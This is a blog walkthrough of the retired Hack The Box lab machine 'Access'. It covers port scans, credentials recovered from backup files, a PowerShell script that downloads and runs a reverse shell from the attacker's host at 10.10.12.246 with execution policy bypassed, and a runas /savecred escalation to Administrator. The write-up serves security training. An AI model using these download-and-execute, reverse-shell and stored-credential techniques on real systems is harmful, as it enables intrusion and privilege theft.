@@ -1,0 +1,135 @@
+
+
+Access: Hack The Box Walkthrough
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+3 Mar 2019
+
+
+
+3 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Access, a retired vulnerable VM created by egre55, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Access is a retired vulnerable VM from Hack The Box.
+Information Gathering
+Letâs start with a masscan probe to establish the open ports in the host.
+# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.98 --rate=1000
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-09 10:37:40 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.98
+Discovered open port 23/tcp on 10.10.10.98
+Discovered open port 21/tcp on 10.10.10.98
+
+masscan finds three open ports: 21/tcp, 23/tcp and 80/tcp. Letâs do one better with nmap scanning these discovered ports.
+# nmap -n -v -Pn -p21,23,80 -A --reason -oN nmap.txt 10.10.10.98
+...
+PORT   STATE SERVICE REASON          VERSION
+21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+23/tcp open  telnet? syn-ack ttl 127
+80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+
+Since anonymous FTP is allowed, letâs check it out first.
+
+
+
+Thereâs a huge file in the Backups directoryâbackup.mdb. It appears to be a Microsoft Access Jet Database (MDB) file.
+
+
+
+Thereâs also a big fileâAccess Control.zip, in the Engineers directory.
+
+
+
+The archive file is password-protected and it appears to contain a Personal Storage Table (PST) file in it.
+Microsoft Office
+I know there are Linux tools to read MDB and PST files but for the sake of convenience, letâs use Microsoft Office to open them. Iâll use Microsoft Access to read the MDB file. Hereâs what I found in the auth_user table.
+
+
+
+The password [email protected] is the one to extract the PST file from the archive. Iâll use Microsoft Outlook to read the PST file. Thereâs only one email in the mailbox.
+
+
+
+Another credential (security:4Cc3ssC0ntr0ller) in the bag!
+Telnet
+Letâs give the credential a shot with the Telnet service.
+
+
+
+Awesome.
+The file user.txt is at securityâs desktop.
+
+
+
+Privilege Escalation
+Telnet is painfully slow. Letâs run a reverse shell in PowerShell. First of all, letâs write a wget script in PowerShell. Note that this system is running Windows Server 2008. As such, only PowerShell 2.0 is available. Echo the following lines to C:\Users\security\Downloads\wget.ps1.
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile($Args[0],$Args[1])
+
+
+
+
+Next, generate a reverse shell in PowerShell with msfvenom like so.
+
+
+
+Run the following commands in the telnet session to transfer rev.ps1 over.
+powershell -ExecutionPolicy Bypass -File wget.ps1 http://10.10.12.246/rev.ps1 rev.ps1
+
+Now, we can execute the reverse shell with the following command.
+powershell -ExecutionPolicy Bypass -NoExit -File rev.ps1
+
+The -NoExit switch indicates that we donât want to exit from the thread. We should get a reverse shell in our nc listener.
+
+
+
+During enumeration of securityâs account, I ran the cmdkey command to list the stored credentials in the box and this is what I saw.
+
+
+
+Perfect. This means that I can use the /savecred switch in runas to impersonate Administrator without knowing the password! Now, letâs claim the prize with the following command:
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\security\Downloads\root.txt"
+
+
+
+
+
+
